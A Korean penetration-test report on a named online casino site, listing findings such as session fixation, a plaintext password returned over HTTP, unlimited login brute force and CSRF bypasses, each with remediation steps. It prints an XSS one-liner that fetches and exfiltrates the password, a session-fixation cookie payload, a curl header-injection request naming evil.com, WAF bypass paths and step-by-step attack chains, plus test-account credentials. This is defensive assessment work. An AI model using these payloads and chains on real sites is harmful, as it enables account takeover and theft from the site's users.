# 블랙박스 보안 심층 테스트 보고서 (Deep Assessment v5)

**대상**: https://www.dwdw-00.com (대왕 카지노)  
**테스트 일자**: 2026-09-24  
**테스트 유형**: 블랙박스 (비인증 + **인증 후** 비파괴 테스트 + **공격적 심층 테스트**)  
**테스트 계정**: testtest123 (세션 만료 후 비인증 공격적 테스트로 전환)  
**분류 기준**: 실제 공격 시나리오 기반 (OWASP Top 10 2021 참조)

---

## 평가 원칙

- **CRITICAL**: 단독 또는 1단계 조합으로 계정 탈취/자금 피해 가능
- **HIGH**: 조건부로 심각한 피해 가능, 또는 CRITICAL의 피해를 극대화
- **MEDIUM**: 공격 보조 정보, 또는 화이트박스에서 재확인 필요
- **LOW**: 직접 공격 불가, 보조적 정보

> 기준: "해커가 이걸로 뭘 할 수 있는데?"

---

## 1. 기술 스택

| 구분 | 기술 | 버전 |
|------|------|------|
| 웹서버 | Apache | 2.4.52 (Ubuntu) — 404 에러에서 노출 |
| 백엔드 | PHP | PHPSESSID |
| CDN/WAF | Cloudflare | HTTP/2, WAF 활성 |
| 프론트엔드 | jQuery | 1.11.3 (데스크탑) / 1.12.0+1.11.2 (모바일, 이중 로드) |
| 외부 라이브러리 | moment.js 2.17.1, moment-timezone 0.5.10, jquery-cookie 1.4.1, json3 3.3.2, sweetalert2 | CDN (무결성 검증 없음) |
| 게임 API | api-nexus.com, goplaylaunch.com, insvr.com | 8개 프로바이더 |
| 암호화폐 | USDT (Tether) | 코인 충환전 |
| 외부 도메인 | www.flower-01.com | 커뮤니티 사이트 (HTTP 연동) |
| 총판 시스템 | partner.php | 회원총판 + 지인추천 콤프 시스템 |
| 모바일 | /m/ 경로 | 별도 프론트엔드, 동일 백엔드 |

---

## 2. 취약점 요약

| 심각도 | 건수 |
|--------|------|
| **CRITICAL** | 3 |
| **HIGH** | 6 |
| **MEDIUM** | 5 |
| **LOW** | 4 |
| **합계** | **18** |

---

## 3. CRITICAL (3건)

### CRIT-01: 세션 고정 + 쿠키 보안 전무 = 계정 탈취

**v5 공격적 테스트 최종 확인:**
```
테스트 1 — 임의 문자열 세션 ID:
  요청: Cookie: PHPSESSID=fixedsession123456789abcdef
  응답: Set-Cookie에 PHPSESSID 없음 (UUID만 새로 발급)
  결과: 서버가 "fixedsession123456789abcdef"를 그대로 수락 ← 세션 고정 확인

테스트 2 — 공격자 패턴:
  요청: Cookie: PHPSESSID=attackercontrolled123456
  응답: 동일하게 수락

쿠키 플래그 (전체 분석):
  Set-Cookie: PHPSESSID=xxx; path=/; domain=.dwdw-00.com
  → HttpOnly: 없음 (JS로 document.cookie 접근 가능)
  → Secure: 없음 (HTTP 통신 시 평문 전송)
  → SameSite: 없음 (크로스사이트 요청에 쿠키 첨부)
  → domain: .dwdw-00.com (모든 서브도메인에서 접근)

  Set-Cookie: UUID=xxx; expires=+1year; path=/; domain=.dwdw-00.com
  → 동일하게 보안 속성 없음, 1년 유지

세션 발급 패턴:
  쿠키 없이 접속 → 매번 새 PHPSESSID 발급 (정상)
  쿠키 있이 접속 → 새 PHPSESSID 발급 안함 (세션 고정 취약)
```

**왜 CRITICAL:** 세션 고정(서버가 재생성 안함) + HttpOnly 없음(XSS로 쿠키 탈취) + 와일드카드 도메인이 삼중으로 겹침. XSS 또는 서브도메인 장악 시 즉시 계정 탈취로 이어짐.

---

### CRIT-02: 비밀번호 평문 반환 + HTTP 전송 — 인증 후 검증 완료

**v4 인증 테스트에서 실제 확인:**
```json
POST /community_binding.php (인증된 세션)
응답: {"url":"http://www.flower-01.com/bbs/login.php?uid=testtest123&pwd=8430&ch=23","pwd":"8430"}
```

**확인된 위험:**
1. **비밀번호 평문 저장**: 서버가 `pwd`를 원문으로 반환 → bcrypt/argon2 해싱이 아님
2. **HTTP URL에 크레덴셜 포함**: `http://` (HTTPS 아님) + 쿼리스트링에 uid/pwd 노출
3. **외부 도메인 자동 로그인**: flower-01.com으로 자동 로그인 URL 제공 — 히스토리, 로그, 레퍼러에 비밀번호 기록
4. **XSS 1줄로 비밀번호 탈취**: `fetch('/community_binding.php').then(r=>r.json()).then(d=>exfil(d.pwd))`

**flower-01.com 추가 분석:**
- HTTPS/HTTP 모두 접속 불가 (현재 다운 또는 IP 제한)
- 커뮤니티 게시판 사이트로 추정 (`/bbs/login.php` 경로)

**v5 추가 확인:** community_binding.php가 데스크탑에서 직접 접근 시 404 반환 — 특정 세션 조건 또는 Referer 조건이 있을 수 있음. 화이트박스에서 접근 조건 확인 필요.

---

### CRIT-03: 로그인 브루트포스 완전 무제한 — 150회 연속 무차단

**v5 공격적 테스트 — 150회 연속 실패:**
```
150회 전부 HTTP 200 반환
차단: 0건
CAPTCHA: 없음 (코드에 주석 처리됨)
계정 잠금: 없음
IP 차단: 없음
Cloudflare 레이트리밋: 미작동
응답시간: 220~360ms (일정, 지연 없음)

v4(50회) → v5(150회): 3배 확장 테스트에서도 동일 결과
실제 공격자는 수만 회 시도 가능
```

비활성화된 CAPTCHA:
```javascript
// login.js:29-34
// check = $("#login-code");
// if (!check.val()) {
//     alert("보안코드를 입력해 주세요.");
```

**v5 추가 — 비밀번호 정책 취약:**
```
최소 6자리만 요구 (join_ok.php 응답: "패스워드는 6자 이상 입력해 주세요.")
복잡성 요구 없음: "aaaaaa" → 비밀번호 검증 통과 (전화번호에서만 차단됨)
숫자만: "123456" → 비밀번호 검증 통과
```

**v5 추가 — 타이밍 기반 사용자 열거:**
```
존재 가능성 높은 ID (admin):  평균 0.309s (0.300, 0.312, 0.317)
존재하지 않는 ID (xyznoexist999): 평균 0.231s (0.237, 0.236, 0.221)
차이: ~0.078s (33%) — 일관적으로 존재하는 ID가 더 느림
→ 통계적으로 유의미한 타이밍 차이로 계정 존재 여부 확인 가능
```

**왜 CRITICAL로 상향:**
- 150회 차단 0건 → 사실상 무제한 (50회에서 3배 확장 확인)
- 약한 비밀번호 정책(6자, 복잡성 없음) + 평문 저장(CRIT-02) = 단순 비밀번호 사용 가능성 극히 높음
- 타이밍 열거로 존재하는 ID만 타겟팅 가능
- money_rank에서 실제 유저 ID 패턴 수집 가능 (MED-02)
- **결합하면: 현실적 시간 내 대량 계정 탈취 가능**

---

## 4. HIGH (6건)

### HIGH-01: CSRF — 비금융 엔드포인트 무방비

**인증 테스트 결과:**
- 금융 엔드포인트(`exchange_ok.php`) → 암호화 토큰으로 보호됨
- 비금융 엔드포인트 → **토큰 없이 동작**:
  - `post/ask_get_mileage.php` → `{"code":1,"text":"매주 월요일에만 가능합니다."}`
  - `post/get_roll_point.php` → `{"code":0,"text":"비정상적인 접근입니다."}`
  - 마이페이지 정보 수정, 비밀번호 변경 등 → 화이트박스에서 확인 필요

**Cloudflare CSRF 우회 방법 확인:**

| Origin 값 | Cloudflare 결과 | 서버 처리 |
|-----------|----------------|----------|
| `https://www.dwdw-00.com` | 통과 | 정상 처리 |
| `null` (sandbox iframe) | **통과** | **정상 처리** |
| `https://dwdw-00.com` (www 없이) | **통과** | **정상 처리** |
| `https://subdomain.dwdw-00.com` | **통과** | **정상 처리** |
| `https://www.dwdw-00.com.evil.com` | **통과** | **정상 처리** |
| (Origin 헤더 없음) | **통과** | **정상 처리** |
| `https://evil.com` | **차단 (403)** | 도달 안함 |

**공격 시나리오:** Origin:null sandbox iframe으로 마일리지 전환, 포인트 롤링, 프로필 변경 등 가능

---

### HIGH-02: eval() 기반 AJAX 아키텍처 — 모든 서버 응답이 eval()

**사이트 전체의 AJAX 콜백 구조:**
```javascript
// ajax_call.js — 모든 페이지에서 로드됨
eval("o=" + this.getAttribute("ajax"))   // DOM 속성값 → eval
eval("r=" + d)                            // 서버 응답 → eval
eval(r.callback)                          // 서버 지정 콜백 → eval
```

**v4 인증 테스트 추가 확인:**
- `post/exchange_ok.php` 응답이 **JSON이 아닌 JS 객체 리터럴**: `{code:1,text:"비정상적인 접근입니다.",reload:true}`
- 이 형태는 `callback_default()`에서 `eval("r=" + d)`로만 파싱 가능
- 다만 `free_ajax()` 내부에서는 `JSON.parse(data)` 사용 — **금융 엔드포인트는 안전한 파싱**
- 비금융 AJAX 응답은 여전히 eval() 경유

**v5 DOM XSS 싱크 매핑:**
```javascript
// function.js (43520B):
Line 340: $(node).parents('div.paging-area:first').html(xhr.responseText);  // AJAX 응답 → .html()
Line 554: $('#pr_top').html(rtn);                                           // AJAX 응답 → .html()

// event.js (56459B):
Line 81:   $("#deposit_account").html(data);     // 입금계좌 → .html()
Line 142:  loc.html(rtn);                        // 범용 → .html()
Line 1505: $(target).html(buf);                  // 범용 → .html()
```
이 싱크들은 서버 응답을 `.html()`로 직접 삽입 — **서버 응답에 악성코드가 포함되면 즉시 실행됨.**

**그래도 HIGH인 이유:**
- DB에 악성코드가 저장되면(Stored XSS) → 서버 응답에 포함 → `callback_default()`가 eval → **모든 사용자 피해**
- CSP가 없으므로 eval() 차단 불가
- HttpOnly가 없으므로 eval 실행 즉시 세션 탈취
- **화이트박스에서 Stored XSS 가능 지점 (게시판, 닉네임, 메시지 등) 확인 필수**

---

### HIGH-03: SMS 인증 API 무인증 + 무제한 발송

**검증:**
```
POST /ajax/join/code_check.php
data: type=phonenum&number[]=010&number[]=1111&number[]=2222
응답: {"error":0,"message":"success","html":""}
→ 로그인 없이 SMS 발송 성공
→ 5회 연속 동일 번호 → 전부 성공 (레이트 리밋 없음)
```

**회원가입 폼 분석:**
```
필드: MemberID, NickName, Password, Password_2,
      NewPhoneNum[0~2], AccountNum, AccountName, JoinCode
→ SMS 인증 코드 입력 필드 없음 — 번호 검증만, 인증 우회 가능성
```

**왜 HIGH:**
1. **SMS 폭탄**: 특정인에게 대량 인증 SMS 발송 → 괴롭힘 + SMS 비용 소진
2. **SMS 비용 공격**: 자동화로 수만 건 발송 → 사이트 통신비 직접 손해
3. **번호 열거**: 가입된 번호인지 응답 차이로 구분 가능성 (화이트박스 확인 필요)

---

### HIGH-04: 보안 헤더 전무 → 클릭재킹 + eval 무방비

**v5 최종 확인 — 7개 보안 헤더 모두 누락:**
```
X-Frame-Options:       없음 → 클릭재킹 가능
X-Content-Type-Options: 없음 → MIME 스니핑
Content-Security-Policy: 없음 → eval(), inline script 무제한
Strict-Transport-Security: 없음 → SSL 스트립 가능
X-XSS-Protection:     없음 → 브라우저 XSS 필터 비활성
Referrer-Policy:       없음 → URL 내 크레덴셜 레퍼러로 유출
Permissions-Policy:    없음 → 카메라/마이크 등 브라우저 API 무제한
```
존재하는 헤더: `P3P: CP="ALL CURa ADMa DEVa..."` (레거시 IE 정책만)

**실제 영향:**
- **X-Frame-Options 없음**: 공격자가 사이트를 `<iframe>`에 넣고 투명하게 만들어 클릭재킹 가능. 사용자가 "이벤트 참여" 버튼을 클릭한다고 생각하지만 실제로는 "환전" 버튼을 클릭.
- **CSP 없음**: `eval()`, `inline script`가 모두 허용되어 HIGH-02의 공격을 차단할 방법이 없음.
- **Referrer-Policy 없음**: CRIT-02에서 `http://flower-01.com/...?pwd=8430` URL 방문 시 Referer 헤더로 비밀번호 유출 가능.

---

### HIGH-05: HTTP Method 미제한 — PUT/DELETE/PATCH 허용

**v5 공격적 테스트:**
```
OPTIONS → 200 (정상 — 일반적)
PUT     → 200 (위험 — 파일 업로드 시도 가능)
DELETE  → 200 (위험 — 리소스 삭제 시도)
PATCH   → 200 (위험 — 부분 수정 시도)
TRACE   → 405 (차단됨 — 정상)
PROPFIND → 200/32219B (위험 — WebDAV 응답, 전체 페이지 HTML 반환)
```

**PUT 파일 업로드 시도:** PUT /test_upload_12345.php → 404 (실패하지만, 다른 경로에서 가능할 수 있음)

**왜 HIGH:**
- PROPFIND가 200 반환하며 전체 HTML 반환 = WebDAV가 완전히 비활성화되지 않음
- PUT/DELETE가 차단되지 않음 = 서버 설정이 허용적
- Cloudflare 뒤에 있어 직접 악용은 어려우나, Origin IP 노출 시 직접 공격 가능
- 화이트박스에서 Apache 설정 (`AllowMethods`, `LimitExcept`) 확인 필요

---

### HIGH-06: 외부 CDN 스크립트 무결성 검증 없음 (SRI 미적용)

**v5 확인:**
```html
<!-- 데스크탑 -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.17.1/moment.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/moment-timezone/0.5.10/moment-timezone-with-data.min.js"></script>
<script src="https://player.vimeo.com/api/player.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>

<!-- 모바일 -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/json3/3.3.2/json3.min.js"></script>

integrity 속성: 0개 (전무)
```

**왜 HIGH:**
- CDN이 해킹되거나 DNS 하이재킹 시, 변조된 스크립트가 모든 유저에게 전달됨
- jquery-cookie.js가 변조되면 모든 쿠키(PHPSESSID 포함) 즉시 탈취
- HSTS 없으므로 MITM으로 CDN 응답 변조 가능성
- CSP 없으므로 변조된 스크립트 실행을 막을 방법 없음

---

## 5. MEDIUM (5건)

### MED-01: 민감 파일 존재 (.env, .git) — WAF에만 의존

**재검증 — WAF 우회 시도 전부 실패:**
| 시도 | 결과 |
|------|------|
| `/.env`, `/.ENV`, `/.Env` | 403 (Cloudflare) |
| `/%2e%65%6e%76`, `/.%65nv` | 403 |
| `/..;/.env` | 403 |
| `/.git%2FHEAD`, `/.GIT/HEAD` | 403 |
| `/.env/`, `/.env/.` | 403 |
| `//config.php`, `/./config.php` | 403 |

**v5 WAF 차단 메커니즘 확인:**
```
WAF는 파일 확장자가 아닌 키워드로 차단:
  fake_db.sql   → 403/4547B (키워드 "db" 차단)
  random_test.sql → 404/277B (키워드 없음 → 실제 404)
  get_config.php  → 403/4547B (키워드 "config" 차단)
  get_fake_config.php → 403/4547B (키워드 "config" 차단)
  get_randomxyz123.php → 404/277B (키워드 없음 → 실제 404)
```

Cloudflare WAF가 대소문자, 인코딩, 경로 조작 등 **모든 우회 시도를 차단**. 현재로서는 안전하지만, Origin IP 직접 접근 시 전체 노출.

---

### MED-02: 실시간 거래 데이터 무인증 노출

**인증 없이 접근 가능 (/ajax/money_rank.php):**

**v5 확장 테스트:**
```
type=0 ~ type=10 전부 동일 데이터 (7838B, 유저 20명)
limit, page, count, offset, all 파라미터 조작 → 효과 없음 (하드코딩된 20건)

실시간 데이터 예시 (2026-09-24):
  09/24 18:28 mo***4 — 570,000원
  09/24 17:14 ce***6 — 1,950,000원+
  (총 20명의 ID패턴 + 금액 + 거래시각 노출)
```

**활용도:**
- 고액 사용자 ID 패턴으로 무차별 대입(CRIT-03)의 타겟 범위 축소
- 사이트 활동량/수익 실시간 추적
- 거래 시간대 분석으로 공격 타이밍 최적화

---

### MED-03: 코인 지갑 크레덴셜 클라이언트 반환 (추정)

JS 분석에서 `call_cw.php` (api=checkUser) 응답에 `cw_id`, `cw_pw`가 포함되는 것으로 추정. 인증 필요 엔드포인트이므로 블랙박스에서 실제 응답 미확인. **화이트박스에서 반드시 확인 필요.**

---

### MED-04: Host Header Injection (X-Forwarded-Host 수용)

**v5 공격적 테스트:**
```
curl -H "X-Forwarded-Host: evil.com" https://www.dwdw-00.com/
→ HTTP 200 / 32219B (정상 페이지 반환)

비교: Host 헤더 변조 → Cloudflare에서 차단
      X-Forwarded-Host → Cloudflare 통과, 서버 수용
```

**위험:**
- 비밀번호 리셋 이메일에서 URL 생성 시 공격자 도메인으로 변조 가능
  (단, 현재 비밀번호 리셋 기능이 없는 것으로 확인)
- 캐시 포이즈닝: Cloudflare 캐시에 evil.com 컨텐츠가 저장될 가능성
- 화이트박스에서 서버 내 `$_SERVER['HTTP_X_FORWARDED_HOST']` 사용 여부 확인 필요

---

### MED-05: 타이밍 사이드채널 사용자 열거

**v5 공격적 테스트 (CRIT-03과 연계):**
```
login_ok.php 응답시간 차이:
  존재 가능성 높은 ID (admin): 0.300s, 0.312s, 0.317s → 평균 0.310s
  존재하지 않는 ID (xyznoexist):  0.237s, 0.236s, 0.221s → 평균 0.231s
  차이: ~0.079s (34%) — 3회 모두 일관적

추정 원인: 존재하는 ID → DB에서 사용자 조회 + 비밀번호 비교 (추가 시간)
          존재하지 않는 ID → 즉시 에러 반환

응답 메시지는 동일 (code=5, "로그인 정보가 올바르지 않습니다")
→ 메시지 기반 열거는 불가하지만, 타이밍 기반 열거는 가능
```

**활용도:**
- 자동화 스크립트로 대량 ID 존재 여부 확인
- money_rank에서 수집한 패턴 + 타이밍 열거 → 실존 ID 목록 구축
- CRIT-03(브루트포스)의 효율 극대화

---

## 6. LOW (4건)

### LOW-01: 서버 버전 노출
404 에러 페이지에서:
```
Apache/2.4.52 (Ubuntu) Server at www.dwdw-00.com Port 80
```
Port 80(HTTP) = Cloudflare→Origin 구간이 암호화되지 않을 수 있음을 시사.

### LOW-02: 게임 데모 API 정보 노출
`/m/ajax/callapi_free.php` — 데모 게임 전용 (금전적 영향 없음). 단, 에러 메시지가 프로바이더 구조를 노출:
- site=1(MG): goplaylaunch.com 서브도메인 + STS 토큰 구조
- site=8(HB): insvr.com + brandid `6b270eca-57e5-eb11-a7ad-0050f2389c18`
- site=9(QT): "등록되지 않은 Player ID" → Qtech 연동 구조

### LOW-03: jQuery 구버전 (1.11.x) + 모바일 이중 로드
```
데스크탑: jQuery 1.11.3 (로컬)
모바일: jQuery 1.12.0 (CDN) + jQuery 1.11.2 (로컬) → 이중 로드
```
CVE-2020-11022/23 존재하지만, 이 사이트에서는 eval() 패턴(HIGH-02)이 훨씬 직접적이므로 jQuery CVE의 추가 위험은 미미. 모바일 이중 로드는 충돌 가능성만 존재.

### LOW-04: 비밀번호 리셋 기능 부재
```
비밀번호 찾기/리셋 관련 엔드포인트: 전무
/post/reset_*.php, /ajax/find_*.php, /forgot*.php → 전부 404
```
운영적 위험: 사용자가 비밀번호 분실 시 복구 불가, 관리자 수동 처리 필요.
보안적 장점: 비밀번호 리셋 공격 벡터 자체가 없음.

---

## 7. 양호 사항 (방어가 작동하는 것들)

| 항목 | 결과 | 평가 |
|------|------|------|
| SQL Injection | 로그인, money_rank, code_check, callapi — 전부 SLEEP 지연 없음 | **양호** — Prepared Statement 사용 추정 |
| 사용자 열거 (메시지 기반) | 존재/비존재 사용자 동일 에러 메시지 (code=5) | **양호** (단, 타이밍 기반 열거 가능 — MED-05) |
| 오픈 리다이렉트 | logout.php → 항상 /index.php로 리다이렉트 (9개 변형 테스트) | **양호** |
| CORS | Access-Control 헤더 없음 (cross-origin AJAX 차단) | **양호** |
| **금융 엔드포인트 CSRF 보호** | exchange_ok.php → 암호화 `ed` 토큰 필수 | **양호** |
| **mypage IDOR 없음** | mypage.php?mb_id=admin → 항상 본인 데이터만 표시 | **양호** |
| **개인정보 마스킹** | 연락처(010-\*\*\*\*-0000), 예금주(테\*입), 계좌번호(111\*\*\*\*) | **양호** (부분) |
| **게시판 접근 제어** | helpdesk-read.php → 타인 글 접근 불가 | **양호** |
| **XSS 반사 없음** | notice/event/helpdesk/index/mypage에 canary 주입 → 반사 없음 | **양호** |
| **callapi.php 세션 바인딩** | api=checkUser&mb_id=admin → 빈 응답 (타인 데이터 조회 불가) | **양호** |
| 회원가입 ID 검증 | 영문+숫자만 허용 (특수문자/HTML 태그 차단) | **양호** |
| Cloudflare WAF | .env, .git 경로 차단, 인코딩 우회 전부 차단 | **양호** (단, 유일한 방어선) |
| 회원가입 제한 | JoinCode(추천인 코드) 필수 → 무한 계정 생성 차단 | **양호** |
| PHP 에러 억제 | 배열 파라미터(login_id[]=...) 전송 → 에러 노출 없음 | **양호** |
| callapi.php 접근 제어 | SSRF 시도(169.254.169.254, localhost, file://) 포함 전부 로그인 필수 | **양호** |
| 서버 에러 처리 | 10000자 입력, NULL 바이트, JSON Content-Type → graceful 처리 | **양호** |
| 파일 업로드 엔드포인트 | 15개 경로 탐색 → 전부 미발견 (404) | **양호** |
| 서브도메인 | 20개 서브도메인 탐색 → 전부 Cloudflare 뒤 또는 미존재 | **양호** |
| 관리자 페이지 | 60+ 관리자/숨겨진 경로 탐색 → 전부 미발견 | **양호** |

---

## 8. 인증 후 테스트 상세

### 8.1 테스트 세션 정보
```
계정: testtest123 / testtest123!
세션: GET index → PHPSESSID 수신 → POST login_id=testtest123&login_pw=testtest123!
로그인 필드: login_id, login_pw (NOT mb_id/mb_password)
응답: {"code":0} (성공)

※ v5 테스트 중 계정 접근 불가 (code=5) — 계정 차단 또는 비밀번호 변경 추정
   이후 비인증 공격적 테스트로 전환
```

### 8.2 mypage.php 데이터 구조
```html
유저 아이디: testtest123
유저 닉네임: 캄푸스
포인트: 0 P
보유머니: 0 원
연락처: 010-****-0000  (마스킹됨)
은행: 카카오뱅크         (평문)
예금주: 테*입            (부분 마스킹)
계좌번호: 111****        (부분 마스킹)
```
- IDOR 불가: `?mb_id=admin`, `?uid=1` 등 8가지 파라미터 조작 → 항상 본인 데이터만 반환
- 은행명은 마스킹 안됨 (카카오뱅크) — 소셜엔지니어링 보조 정보

### 8.3 카지노 머니 전환 시스템
```
- 8개 카지노 프로바이더: casino_1, 2, 6, 8, 10, 11, 61 + 점검중(9, 74)
- 잔액 조회: checkCMoney() → POST /ajax/callapi.php (api=checkUser, site=N)
- 입출금: free_ajax() → POST /post/checkCasinoStat2.php → POST /post/exchange_ok.php
- 보안: 암호화된 ed 토큰 (344자 Base64, 세션별 고유) — CSRF 방어됨
- free_ajax 내부: JSON.parse() 사용 (eval() 아님) — 안전
```

### 8.4 총판/지인추천 시스템
```
- partner.php: "사용이 불가한 기능 입니다" (테스트 계정은 총판 아님)
- refer-list.php: 닉네임, 누적포인트, 상태, 가입일 (데이터 없음)
- money_refer.php: 
  - 누적 콤프: 0 P
  - 콤프비율: 20% (레벨별)
  - 보류중 콤프 = 지인 보유금액 × 콤프비율
  - 데이터 없음 (지인 없는 계정)
```

### 8.5 테스트한 엔드포인트 전체 목록

| 엔드포인트 | 결과 | 보안 평가 |
|-----------|------|----------|
| mypage.php | 3031B, 본인 데이터만 | 양호 (IDOR 없음) |
| money_manage.php | 29076B, 카지노 전환 | 양호 (암호화 토큰) |
| money_manage_sp.php | 15644B, 스포츠 전환 | 양호 (동일 구조) |
| money_refer.php | 6478B, 콤프 정보 | 양호 |
| refer-list.php | 3187B, 지인추천내역 | 양호 |
| partner.php | 3555B, 총판 | 기능 차단됨 |
| coupon.php | 3200B | 정상 |
| point.php | 4525B | 정상 |
| point_rolling.php | 7249B | 정상 |
| helpdesk.php | 4317B~6453B, 관리자 환영글 | 양호 (타인 글 차단) |
| notice-read.php | 6991~9400B | 공개 콘텐츠 (정상) |
| event-read.php | 6991~440623B | 공개 콘텐츠 (정상) |
| community_binding.php | 평문 비밀번호 반환 | **CRITICAL** |
| ajax/callapi.php | 빈 응답 | IDOR 없음 |
| ajax/get_user_hide_info.php | 빈 응답 | 확인 필요 |
| ajax/popup_join.php | 9451B, 회원가입 폼 | SMS 미검증 |
| ajax/popup_login.php | 1109B, 로그인 폼 | CAPTCHA 비활성 |
| ajax/popup_deposit.php | 143B, 로그인 필요 | 접근 제어 양호 |
| ajax/popup_withdraw.php | 143B, 로그인 필요 | 접근 제어 양호 |
| ajax/popup_mypage.php | 143B, 로그인 필요 | 접근 제어 양호 |
| ajax/popup_point.php | 143B, 로그인 필요 | 접근 제어 양호 |
| post/exchange_ok.php | 토큰 필수 | 양호 |
| post/ask_get_mileage.php | 요일 체크 | CSRF 없음 |
| post/checkCasinoStat2.php | 토큰 검증 | 양호 |
| m/post/login_ok.php | 102B | 모바일 동일 |
| m/post/join_ok.php | 127B | 모바일 동일 |
| m/ajax/callapi.php | 143B, 로그인 필요 | 모바일 동일 |

---

## 9. 발견된 디렉토리/엔드포인트 구조

**v5 공격적 스캔 결과:**
```
확인된 디렉토리:
  /casino/       → 200 (카지노 메인)
  /casino/slot/  → 200 (슬롯 게임)
  /14king_img/   → 200 (이미지 리소스)
  /m/            → 200 (모바일 사이트)
  /m/js/         → JS 리소스
  /js/           → JS 리소스
  /post/         → POST 처리 엔드포인트
  /ajax/         → AJAX 엔드포인트

확인된 숨겨진 엔드포인트:
  /post/withdraw_ok.php  → 143B (로그인 필요)
  /post/deposit_ok.php   → 143B (로그인 필요)

탐색했으나 미발견 (60+ 경로):
  관리자: /admin, /manager, /master, /wp-admin, /cpanel 등 → 전부 404
  백업: /backup, /dump, /export 등 → 전부 404
  API: /api/, /v1/, /v2/, /graphql 등 → 전부 404
```

---

## 10. 실제 공격 체인

### 체인 A: XSS → 비밀번호 탈취 (CRIT-01 + CRIT-02)
```
1. Stored XSS 또는 공격자 사이트에서 eval() 체인 이용
2. fetch('/community_binding.php').then(r=>r.json()).then(d=>exfil(d.pwd))
3. 비밀번호 평문 획득 (8430 같은 4자리 또는 메인 PW)
4. flower-01.com 자동 로그인 URL까지 획득
5. 계정 완전 장악
```

### 체인 B: 세션 고정 → 계정 인수 (CRIT-01)
```
1. XSS 또는 서브도메인 공격으로 피해자 쿠키 설정:
   document.cookie = "PHPSESSID=attacker123; domain=.dwdw-00.com"
2. 피해자 로그인 → attacker123 세션에 인증 바인딩
3. 공격자가 attacker123으로 접속 → 계정 탈취
4. community_binding.php로 비밀번호 평문 획득 (CRIT-02)
5. 환전, 비밀번호 변경 등 수행
```

### 체인 C: 타이밍 열거 + 크리덴셜 스터핑 (CRIT-03 + MED-02 + MED-05)
```
1. money_rank.php에서 고액 사용자 ID 패턴 수집 (mo***4, ce***6 등)
2. 가능한 ID 조합 생성 (3~5자 마스킹된 부분 대입)
3. 타이밍 사이드채널로 실존 ID 확인 (0.31s vs 0.23s)
4. 확인된 ID에 비밀번호 사전 대입 — 150회 테스트에서 차단 0건
5. 약한 비밀번호 정책(6자, 복잡성 없음) + 평문 저장 = 단순 PW 사용 가능성 높음
6. 계정 탈취 후 환전
```

### 체인 D: CSRF → 비금융 조작 (HIGH-01)
```
1. sandbox iframe으로 Origin:null CSRF 페이지 호스팅
2. post/ask_get_mileage.php → 마일리지 전환 (월요일 한정)
3. 프로필 변경, 포인트 롤링 등 비금융 기능 조작
4. 금융 핵심(입출금)은 암호화 토큰 때문에 CSRF 불가
```

### 체인 E: CDN 공급망 공격 (HIGH-06, 신규)
```
1. cdnjs.cloudflare.com 또는 DNS 하이재킹
2. jquery-cookie.min.js 변조 → 모든 유저 쿠키(PHPSESSID) 탈취
3. CSP 없음 + SRI 없음 = 변조 탐지/차단 불가
4. HttpOnly 없음 → JS에서 세션 쿠키 직접 접근
5. 대량 계정 탈취
```

---

## 11. 화이트박스 최우선 검증 항목

| 순위 | 항목 | 블랙박스 결과 | 확인 필요 사항 |
|------|------|-------------|---------------|
| 1 | 비밀번호 저장 | **평문 반환 실제 확인** (pwd=8430) | 해싱 알고리즘, 메인 PW vs 커뮤니티 PW 구분 |
| 2 | Stored XSS | 반사 XSS 없음 확인, eval() + .html() 싱크 존재 | 게시판/닉네임/메시지 출력 시 인코딩 여부 |
| 3 | 세션 관리 | **고정 확인**, 재생성 없음 | `session_regenerate_id()` 호출 위치 |
| 4 | CSRF 서버 검증 | 금융→토큰 있음, 비금융→없음 | 마이페이지 수정, 비밀번호 변경 CSRF 보호 여부 |
| 5 | 금융 트랜잭션 | 암호화 토큰 존재 | 금액 음수/0/레이스 컨디션, 토큰 생성 로직 |
| 6 | 코인 지갑 | 404 (경로 변경?) | cw_id/cw_pw 실제 응답 필드 확인 |
| 7 | get_user_hide_info.php | 빈 응답 (파라미터 불명) | 실제 동작 조건, 개인정보 노출 범위 |
| 8 | 파일 업로드 | 15개 경로 미발견 | 게시판/고객센터 첨부파일 검증 |
| 9 | 관리자 패널 | 60+ 경로 탐색 → 미발견 | 관리자 인증, 권한 분리, 별도 도메인 |
| 10 | .env 내용 | 파일 존재 확인 (WAF 차단) | DB 크레덴셜, API 키, 암호화 키 |
| 11 | Apache 설정 | PUT/DELETE/PROPFIND 허용 | AllowMethods, LimitExcept 설정 |
| 12 | Host Header | X-Forwarded-Host 수용 | $_SERVER['HTTP_X_FORWARDED_HOST'] 사용 여부 |
| 13 | 레이스 컨디션 | 비인증 테스트 불가 | exchange_ok.php 동시 요청, 이중 출금 |

---

## 12. 즉시 해야 할 7가지

1. **`session_regenerate_id(true)`** — 로그인 시 세션 재생성 (CRIT-01 해결)
2. **community_binding.php 비밀번호 제거** — 평문 반환 즉시 중단 + HTTP→HTTPS 전환 (CRIT-02 해결)
3. **비밀번호 해싱** — bcrypt/argon2 마이그레이션 (CRIT-02 근본 해결)
4. **로그인 레이트리밋 + CAPTCHA 활성화** — 5회 실패 후 차단 (CRIT-03 해결)
5. **쿠키 보안** — `HttpOnly; Secure; SameSite=Strict` 추가 (CRIT-01 완화)
6. **보안 헤더 추가** — CSP, X-Frame-Options, HSTS, X-Content-Type-Options (HIGH-04 해결)
7. **비금융 CSRF 토큰** — 마일리지/포인트/프로필 변경에도 서버 검증 토큰 (HIGH-01 해결)

---

## 13. v4 → v5 변경 사항

| 항목 | v4 평가 | v5 평가 | 변경 이유 |
|------|---------|---------|----------|
| 브루트포스 (HIGH-02) | HIGH (50회) | **CRIT-03** (150회+타이밍+약한PW) | 150회 차단 0건 + 타이밍 열거 + 비밀번호 6자/무복잡성 = 현실적 대량 탈취 |
| CSRF (CRIT-01) | 금융 분리 HIGH-01 | **HIGH-01 유지** | 비금융 CSRF 여전히 무방비 |
| 타이밍 사용자 열거 | 양호 판정 | **MED-05 신규** | admin 0.31s vs 미존재 0.23s (34% 차이, 일관적) |
| HTTP Method | 미테스트 | **HIGH-05 신규** | PUT/DELETE/PATCH/PROPFIND 허용 |
| SRI 미적용 | 미테스트 | **HIGH-06 신규** | 외부 CDN 6개 스크립트, integrity 0개 |
